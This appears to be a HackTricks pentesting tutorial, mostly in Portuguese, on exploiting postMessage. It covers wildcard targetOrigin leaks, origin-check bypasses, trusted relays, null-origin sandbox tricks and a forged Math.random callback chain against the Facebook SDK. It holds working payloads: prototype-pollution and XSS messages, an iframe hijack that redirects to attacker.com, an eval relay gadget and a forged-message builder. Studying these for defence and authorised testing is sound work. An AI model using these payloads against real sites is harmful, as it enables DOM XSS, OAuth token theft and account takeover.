# Vulnerabilidades do PostMessage

{{#include ../../banners/hacktricks-training.md}}

## Enviar **PostMessage**

**PostMessage** usa a seguinte função para enviar uma mensagem:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Note que **targetOrigin** pode ser um '\*' ou uma URL como _https://company.com._\
No **segundo cenário**, a **mensagem só pode ser enviada para esse domínio** (mesmo se o origin do window object for diferente).\
Se o **wildcard** for usado, **mensagens podem ser enviadas para qualquer domínio**, e serão enviadas para o origin do Window object.

### Atacando iframe & wildcard em **targetOrigin**

Como explicado em [**this report**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/), se você encontrar uma página que possa ser **iframed** (sem proteção `X-Frame-Header`) e que esteja **enviando sensível** mensagem via **postMessage** usando um **wildcard** (\*), você pode **modificar** o **origin** do **iframe** e **leak** a **sensível** mensagem para um domínio controlado por você.\
Observe que se a página puder ser iframed mas o **targetOrigin** estiver **definido para uma URL e não para um wildcard**, esse **truque não funcionará**.
```html
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener exploitation

**`addEventListener`** é a função usada pelo JS para declarar a função que está **esperando `postMessages`**.\
Um código similar ao seguinte será usado:
```javascript
window.addEventListener(
"message",
(event) => {
if (event.origin !== "http://example.org:8080") return

// ...
},
false
)
```
Note neste caso como a **primeira coisa** que o código faz é **verificar o origin**. Isso é extremamente **importante**, principalmente se a página for fazer **algo sensível** com a informação recebida (como alterar uma senha). **Se não verificar o origin, atacantes podem fazer com que vítimas enviem dados arbitrários para esses endpoints** e alterar as senhas das vítimas (neste exemplo).

### Enumeração

Para **encontrar event listeners** na página atual você pode:

- **Procurar** no código JS por `window.addEventListener` e `$(window).on` (_JQuery version_)
- **Executar** no console das developer tools: `getEventListeners(window)`

![](<../../images/image (618) (1).png>)

- **Ir para** _Elements --> Event Listeners_ nas developer tools do navegador

![](<../../images/image (396).png>)

- Usar uma **extensão do navegador** como [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) ou [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). Essas extensões vão **interceptar todas as mensagens** e mostrá-las para você.

### Origin check bypasses

- O atributo **`event.isTrusted`** é considerado seguro pois retorna `True` somente para eventos gerados por ações genuínas do usuário. Embora seja difícil de contornar se implementado corretamente, sua relevância nas checagens de segurança é notável.
- O uso de **`indexOf()`** para validação de origin em eventos PostMessage pode ser suscetível a bypass. Um exemplo ilustrando essa vulnerabilidade é:

```javascript
"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")
```

- O método **`search()`** de `String.prototype.search()` é destinado a expressões regulares, não a strings. Passar algo que não seja um regexp leva a uma conversão implícita para regex, tornando o método potencialmente inseguro. Isso porque em regex um ponto (.) age como wildcard, permitindo contornos da validação com domínios especialmente criados. Por exemplo:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- A função **`match()`**, semelhante a `search()`, processa regex. Se o regex for mal estruturado, pode ser propenso a bypass.
- A função **`escapeHtml`** tem a intenção de sanitizar entradas escapando caracteres. Contudo, ela não cria um novo objeto escapado, mas sobrescreve as propriedades do objeto existente. Esse comportamento pode ser explorado. Particularmente, se um objeto puder ser manipulado de modo que sua propriedade controlada não reconheça `hasOwnProperty`, o `escapeHtml` não funcionará como esperado. Isso é demonstrado nos exemplos abaixo:

- Falha esperada:

```javascript
result = u({
message: "'\"<b>\\",
})
result.message // "&#39;&quot;&lt;b&gt;\"
```

- Contornando o escape:

```javascript
result = u(new Error("'\"<b>\\"))
result.message // "'"<b>\"
```

No contexto dessa vulnerabilidade, o objeto `File` é notavelmente explorável devido à sua propriedade somente-leitura `name`. Essa propriedade, quando usada em templates, não é sanitizada pela função `escapeHtml`, levando a riscos de segurança potenciais.

- A propriedade `document.domain` em JavaScript pode ser ajustada por um script para encurtar o domínio, permitindo uma aplicação mais relaxada da same-origin policy dentro do mesmo domínio pai.

### Origin-only trust + trusted relays

Se um receptor apenas checa **`event.origin`** (por exemplo, confia em qualquer `*.trusted.com`) você frequentemente consegue encontrar uma página **"relay" nesse origin que ecoa parâmetros controlados pelo atacante via `postMessage`** para um `targetOrigin`/`targetWindow` fornecido. Exemplos incluem gadgets de marketing/analytics que pegam query params e encaminham `{msg_type, access_token, ...}` para `opener`/`parent`. Você pode:

- **Abrir** a página da vítima em um popup/iframe que tenha um `opener` para que seus handlers sejam registrados (muitos pixels/SDKs só anexam listeners quando `window.opener` existe).
- **Navegar outra janela atacante** até o endpoint relay no origin confiável, preenchendo os campos da mensagem que você quer injetar (message type, tokens, nonces).
- Como a mensagem agora vem **do origin confiável**, a validação apenas por origin passa e você pode disparar comportamentos privilegiados (mudanças de estado, chamadas API, escritas no DOM) no listener da vítima.

Padrões de abuso vistos no mundo real:

- Analytics SDKs (por exemplo, estilo pixel/fbevents) consomem mensagens como `FACEBOOK_IWL_BOOTSTRAP`, então **chamam APIs backend usando um token fornecido na mensagem** e incluem **`location.href` / `document.referrer`** no corpo da requisição. Se você fornecer seu próprio token, pode **ler essas requisições no histórico/logs de requisições do token** e exfiltrar **OAuth codes/tokens** presentes na URL/referrer da página da vítima.
- Qualquer relay que reflete campos arbitrários em `postMessage` permite que você **falsifique tipos de mensagem** esperados por listeners privilegiados. Combine com validação de entrada fraca para alcançar chamadas Graph/REST, desbloqueio de features, ou fluxos equivalentes a CSRF.

Dicas de investigação: enumere listeners `postMessage` que checam apenas `event.origin`, então procure por **endpoints HTML/JS same-origin que encaminhem URL params via `postMessage`** (previews de marketing, popups de login, páginas de erro OAuth). Una ambos com `window.open()` + `postMessage` para contornar checagens de origin.

### e.origin == window.origin bypass

Ao embutir uma página web dentro de um **sandboxed iframe** usando %%%%%%, é crucial entender que o origin do iframe será definido como null. Isso é particularmente importante quando se lida com **sandbox attributes** e suas implicações em segurança e funcionalidade.

Ao especificar **`allow-popups`** no atributo sandbox, qualquer janela popup aberta de dentro do iframe herda as restrições de sandbox do seu pai. Isso significa que, a menos que o atributo **`allow-popups-to-escape-sandbox`** também esteja incluído, o origin da janela popup é igualmente definido como `null`, alinhando-se ao origin do iframe.

Consequentemente, quando um popup é aberto sob essas condições e uma mensagem é enviada do iframe para o popup usando **`postMessage`**, ambos os lados de envio e recebimento terão seus origins definidos como `null`. Essa situação leva a um cenário em que **`e.origin == window.origin`** avalia como true (`null == null`), porque tanto o iframe quanto o popup compartilham o mesmo valor de origin `null`.

For more information **read**:


{{#ref}}
bypassing-sop-with-iframes-1.md
{{#endref}}

### Bypassing e.source

É possível checar se a mensagem veio da mesma window em que o script está escutando (especialmente interessante para **Content Scripts from browser extensions** verificarem se a mensagem foi enviada da mesma página):
```javascript
// If it’s not, return immediately.
if (received_message.source !== window) {
return
}
```
Você pode forçar **`e.source`** de uma mensagem a ser null criando um **iframe** que **envia** o **postMessage** e é **imediatamente excluído**.

Para mais informações **leia:**


{{#ref}}
bypassing-sop-with-iframes-2.md
{{#endref}}

### X-Frame-Header bypass

Para realizar esses ataques idealmente você será capaz de **colocar a página web da vítima** dentro de um `iframe`. Mas alguns headers como `X-Frame-Header` podem **impedir** esse **comportamento**.\
Nesses cenários você ainda pode usar um ataque menos discreto. Você pode abrir uma nova aba para a aplicação web vulnerável e se comunicar com ela:
```html
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Roubar mensagem enviada ao child bloqueando a página principal

Na página a seguir você pode ver como é possível roubar um **sensitive postmessage data** enviado para um **child iframe** bloqueando a **main** page antes do envio dos dados e abusando de um **XSS in the child** para **leak the data** antes de ser recebido:


{{#ref}}
blocking-main-page-to-steal-postmessage.md
{{#endref}}

### Roubar mensagem modificando a location do iframe

Se você consegue iframear uma webpage sem X-Frame-Header que contém outro iframe, você pode **change the location of that child iframe**, então se ele estiver recebendo um **postmessage** enviado usando um **wildcard**, um atacante poderia **change** aquele iframe **origin** para uma página **controlled** por ele e **steal** a mensagem:


{{#ref}}
steal-postmessage-modifying-iframe-location.md
{{#endref}}

### postMessage to Prototype Pollution and/or XSS

Em cenários onde os dados enviados via `postMessage` são executados por JS, você pode colocar a página em um iframe e explorar a **Prototype Pollution/XSS** enviando o exploit via `postMessage`.

A couple of **very good explained XSS though `postMessage`** can be found in [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)

Exemplo de um exploit para abusar de **Prototype Pollution e depois XSS** através de um `postMessage` para um `iframe`:
```html
<html>
<body>
<iframe
id="idframe"
src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document
.getElementById("iframe_victim")
.contentWindow.postMessage(
'{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\" />"}}}',
"*"
)
document
.getElementById("iframe_victim")
.contentWindow.postMessage(JSON.stringify("refresh"), "*")
}

setTimeout(get_code, 2000)
</script>
</body>
</html>
```
Para **mais informações**:

- Link para a página sobre [**prototype pollution**](../deserialization/nodejs-proto-prototype-pollution/index.html)
- Link para a página sobre [**XSS**](../xss-cross-site-scripting/index.html)
- Link para a página sobre [**client side prototype pollution to XSS**](../deserialization/nodejs-proto-prototype-pollution/index.html#client-side-prototype-pollution-to-xss)

### Carregamento de script derivado da origem e pivot na cadeia de suprimentos (estudo de caso CAPIG)

`capig-events.js` registrou apenas um `message` handler quando `window.opener` existia. Em `IWL_BOOTSTRAP` verificou `pixel_id` mas armazenou `event.origin` e mais tarde o usou para construir `${host}/sdk/${pixel_id}/iwl.js`.

<details>
<summary>Manipulador escrevendo origem controlada pelo atacante</summary>
```javascript
if (window.opener) {
window.addEventListener("message", (event) => {
if (
!localStorage.getItem("AHP_IWL_CONFIG_STORAGE_KEY") &&
!localStorage.getItem("FACEBOOK_IWL_CONFIG_STORAGE_KEY") &&
event.data.msg_type === "IWL_BOOTSTRAP" &&
checkInList(g.pixels, event.data.pixel_id) !== -1
) {
localStorage.setItem("AHP_IWL_CONFIG_STORAGE_KEY", {
pixelID: event.data.pixel_id,
host: event.origin,
sessionStartTime: event.data.session_start_time,
})
startIWL() // loads `${host}/sdk/${pixel_id}/iwl.js`
}
})
}
```
</details>

**Exploit (origin → script-src pivot):**
1. Obtenha um opener: por exemplo, no Facebook Android WebView reutilize `window.name` com `window.open(target, name)` para que a janela se torne seu próprio opener, então envie um `postMessage` de um iframe malicioso.
2. Envie `IWL_BOOTSTRAP` de qualquer origin para persistir `host = event.origin` em `localStorage`.
3. Hospede `/sdk/<pixel_id>/iwl.js` em qualquer origin permitido pela CSP (takeover/XSS/upload em um domínio de analytics na whitelist). `startIWL()` então carrega attacker JS no site que embedeia (por exemplo, `www.meta.com`), permitindo chamadas cross-origin com credenciais e account takeover.

Se o controle direto do opener fosse impossível, comprometer um iframe de terceiros na página ainda permitia enviar o `postMessage` forjado para o parent para envenenar o host armazenado e forçar o carregamento do script.

**Backend-generated shared script → stored XSS:** o plugin `AHPixelIWLParametersPlugin` concatenava parâmetros de regra do usuário em JS anexado a `capig-events.js` (por exemplo, `cbq.config.set(...)`). Injetar breakouts como `"]}` permitia injetar JS arbitrário, criando um stored XSS no script compartilhado servido a todos os sites que o carregam.

### A allowlist de origem confiável não é um limite

Uma verificação estrita de `event.origin` só funciona se a origem confiável não puder executar attacker JS. Quando páginas privilegiadas embutem iframes de terceiros e assumem que `event.origin === "https://partner.com"` é seguro, qualquer XSS em `partner.com` se torna uma ponte para o parent:
```javascript
// Parent (trusted page)
window.addEventListener("message", (e) => {
if (e.origin !== "https://partner.com") return
const [type, html] = e.data.split("|")
if (type === "Partner.learnMore") target.innerHTML = html // DOM XSS
})
```
Padrão de ataque observado no mundo real:

1. **Exploit XSS in the partner iframe** e injete um relay gadget para que qualquer `postMessage` se torne code exec dentro da origem confiável:
```html
<img src="" onerror="onmessage=(e)=>{eval(e.data.cmd)};">
```
2. **Da página do atacante**, envie JS para o iframe comprometido que reencaminha um tipo de mensagem permitido de volta para o parent. A mensagem origina-se de `partner.com`, passa pela allowlist e carrega HTML que é inserido de forma insegura:
```javascript
postMessage({
cmd: `top.frames[1].postMessage('Partner.learnMore|<img src="" onerror="alert(document.domain)">|b|c', '*')`
}, "*")
```
3. O parent injeta o HTML do atacante, dando **execução de JS na origem do frame pai** (por exemplo, `facebook.com`), que pode então ser usado para roubar códigos OAuth ou pivotar para fluxos de takeover de conta completos.

Key takeaways:

- **A origem do parceiro não é uma barreira**: qualquer XSS em um parceiro "confiável" permite que atacantes enviem mensagens permitidas que contornam as checagens `event.origin`.
- Manipuladores que **renderizam payloads controlados pelo parceiro** (por exemplo, `innerHTML` em tipos de mensagem específicos) tornam a compromissão do parceiro um DOM XSS de mesma origem.
- Uma **superfície de mensagens** ampla (muitos tipos, sem validação de estrutura) dá mais gadgets para pivotar uma vez que um iframe de parceiro seja comprometido.

### Predicting **`Math.random()`** callback tokens in postMessage bridges

Quando a validação de mensagens usa um “segredo compartilhado” gerado com `Math.random()` (por exemplo, `guid() { return "f" + (Math.random() * (1<<30)).toString(16).replace(".", "") }`) e o mesmo helper também nomeia os plugin iframes, você pode recuperar saídas do PRNG e forjar mensagens confiáveis:

- **Leak PRNG outputs via `window.name`:** O SDK auto-nomeia os plugin iframes com `guid()`. Se você controlar o top frame, coloque a página vítima em um iframe, então navegue o plugin iframe para sua origem (por exemplo, `window.frames[0].frames[0].location='https://attacker.com'`) e leia `window.frames[0].frames[0].name` para obter uma saída bruta de `Math.random()`.
- **Force more outputs without reloads:** Alguns SDKs expõem um caminho de reinit; no FB SDK, disparar `init:post` com `{xfbml:1}` força `XFBML.parse()`, destrói/recria o plugin iframe e gera novos nomes/IDs de callback. Reinit repetido produz tantas saídas de PRNG quanto necessário (note chamadas internas extras de `Math.random()` para IDs de callback/iframe, então os solvers devem pular valores intermediários).
- **Trusted-origin delivery via parameter pollution:** Se um endpoint de plugin first-party reflete um parâmetro não sanitizado no payload cross-window (por exemplo, `/plugins/feedback.php?...%23relation=parent.parent.frames[0]%26cb=PAYLOAD%26origin=TARGET`), você pode injetar `&type=...&iconSVG=...` preservando a origem confiável `facebook.com`.
- **Predict the next callback:** Convert leaked iframe names back to floats in `[0,1)` and feed several values (even non-consecutive) into a V8 `Math.random` predictor (e.g., Z3-based). Generate the next `guid()` locally to forge the expected callback token.
- **Trigger the sink:** Craft the postMessage data so the bridge dispatches `xd.mpn.setupIconIframe` and injects HTML in `iconSVG` (e.g., URL-encoded `<img src=x onerror=...>`), achieving DOM XSS inside the hosting origin; from there, same-origin iframes (OAuth dialogs, arbiters, etc.) can be read.
- **Framing quirks help:** The chain requires framing. In some mobile webviews, `X-Frame-Options` may degrade to unsupported `ALLOW-FROM` when `frame-ancestors` is present, and “compat” parameters can force permissive `frame-ancestors`, enabling the `window.name` side channel.

#### Minimal forged message example
```javascript
// predictedFloat is the solver output for the next Math.random()
const callback = "f" + (predictedFloat * (1 << 30)).toString(16).replace(".", "")
const payload =
callback +
"&type=mpn.setupIconIframe&frameName=x" +
"&iconSVG=%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e"
const fbMsg = `https://www.facebook.com/plugins/feedback.php?api_key&channel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=42%23relation=parent.parent.frames[0]%26cb=${encodeURIComponent(payload)}%26origin=https://www.facebook.com`
iframe.location = fbMsg // sends postMessage from facebook.com with forged callback
```
## Referências

- [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)
- [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
- [Leaking fbevents: OAuth code exfiltration via postMessage trust leading to Instagram ATO](https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html)
- Para praticar: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)
- [CAPIG postMessage origin trust → script loading + stored JS injection](https://ysamm.com/uncategorized/2025/01/13/capig-xss.html)
- [Self XSS Facebook Payments](https://ysamm.com/uncategorized/2026/01/15/self-xss-facebook-payments.html)
- [Facebook JavaScript SDK Math.random callback prediction → DOM XSS writeup](https://ysamm.com/uncategorized/2026/01/17/math-random-facebook-sdk.html)
- [V8 Math.random() state recovery (Z3 predictor)](https://github.com/PwnFunction/v8-randomness-predictor)

{{#include ../../banners/hacktricks-training.md}}
